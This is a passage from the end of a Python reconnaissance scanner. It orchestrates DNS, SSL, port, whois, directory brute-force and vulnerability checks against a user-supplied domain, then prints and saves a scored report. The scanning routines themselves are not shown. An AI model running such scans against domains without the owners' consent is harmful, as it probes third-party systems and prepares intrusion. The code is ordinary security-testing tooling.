                open_ports = [p for p in self.results['ports'] if p.get('state') == 'open']
                f.write(f"OPEN PORTS ({len(open_ports)}):\n")
                for port in open_ports:
                    f.write(f"  [+] {port.get('port')}/{port.get('protocol', 'tcp')}: {port.get('service', '')}\n")
                f.write("\n")

            if self.results['subdomains']:
                f.write(f"SUBDOMAINS ({len(self.results['subdomains'])}):\n")
                for sub in self.results['subdomains'][:10]:
                    f.write(f"  [+] {sub}\n")

        print(f"{Fore.GREEN}[+] Text report saved to {txt_filename}")

    def run_full_scan(self):
        print(f"""
{Fore.RED}
╔═╗┬ ┬┌─┐┬─┐┌─┐┌─┐  ╔═╗┌─┐┌┬┐┌─┐┌─┐┬─┐┌┬┐
╠═╝└┬┘├─┘├┬┘├┤ └─┐  ╚═╗├┤  │ ├┤ ├┤ ├┬┘ │ 
╩   ┴ ┴  ┴└─└─┘└─┘  ╚═╝└─┘ ┴ └─┘└─┘┴└─ ┴ 
{Fore.RESET}
{Fore.YELLOW}              ULTIMATE SECURITY ANALYZER
{Fore.RED}               FOR AUTHORIZED TESTING ONLY!
{Fore.RESET}
        """)

        try:
            self.check_dns()
            self.check_http_https()
            self.check_ssl_certificate()
            self.full_port_scan()
            self.check_whois()
            self.directory_bruteforce()
            self.check_vulnerabilities()

            self.print_banner("SCAN COMPLETE")

            print(f"\n{Fore.CYAN}{'=' * 80}")
            print(f"{Fore.YELLOW}SUMMARY FOR: {self.domain}")
            print(f"{Fore.CYAN}{'=' * 80}")

            print(f"{Fore.GREEN}[+] Security Score: {self.results['security_score']}/100")

            risk_color = Fore.RED if self.results['security_score'] < 50 else Fore.YELLOW if self.results[
                                                                                                 'security_score'] < 70 else Fore.GREEN
            print(f"{risk_color}[+] Risk Level: {self.results.get('risk_level', 'UNKNOWN')}")

            if self.results['critical_vulns']:
                print(f"\n{Fore.RED}[!] CRITICAL VULNERABILITIES FOUND ({len(self.results['critical_vulns'])}):")
                for vuln in self.results['critical_vulns']:
                    print(f"    {Fore.RED}● {vuln}")

            if self.results['vulnerabilities']:
                print(f"\n{Fore.YELLOW}[!] VULNERABILITIES FOUND ({len(self.results['vulnerabilities'])}):")
                for vuln in self.results['vulnerabilities'][:10]:
                    print(f"    {Fore.YELLOW}● {vuln}")

            open_ports = [p for p in self.results['ports'] if p.get('state') == 'open']
            if open_ports:
                print(f"\n{Fore.CYAN}[+] OPEN PORTS ({len(open_ports)}):")
                for port in open_ports:
                    print(
                        f"    {Fore.CYAN}● {port.get('port')}/{port.get('protocol', 'tcp')}: {port.get('service', '')}")

            self.save_results()

            print(f"\n{Fore.GREEN}[+] Scan completed successfully!")
            print(f"{Fore.YELLOW}[!] Remember: This tool is for authorized security testing only!")

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
            self.save_results()
        except Exception as e:
            print(f"{Fore.RED}[-] Critical error: {e}")
            import traceback
            traceback.print_exc()
            self.save_results()


def main():
    if len(sys.argv) > 1:
        domain = sys.argv[1]
    else:
        domain = input(f"{Fore.CYAN}[?] Enter domain (example.com): {Fore.RESET}").strip()

    if not domain:
        print(f"{Fore.RED}[-] No domain specified")
        return

    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]

    analyzer = UltimateSecurityAnalyzer(domain)
    analyzer.run_full_scan()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated")
    except Exception as e:
        print(f"{Fore.RED}[-] Fatal error: {e}")